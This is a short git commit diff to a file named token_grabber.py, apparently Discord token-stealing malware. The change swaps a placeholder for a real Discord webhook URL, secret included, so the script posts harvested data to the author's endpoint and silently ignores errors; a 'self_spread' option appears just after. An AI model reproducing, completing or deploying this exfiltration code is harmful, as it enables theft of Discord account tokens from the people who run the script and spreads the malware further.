e92a26c745f32292dbfacec153174e0b071b3c66
hydra121245 <102030002+hydra121245@users.noreply.github.com>
2022-03-21 16:37:48 +0530

    Update token_grabber.py

--- token_grabber.py
+++ token_grabber.py
@@ -181,7 +181,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discord.com/api/webhooks/955418986584088606/p2BWmmQGeCKwxQPcbIReqCQcZD2WwaIqMHbIkboQZLEBjsKjZj8I8UqlEO0v39pec_6n", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
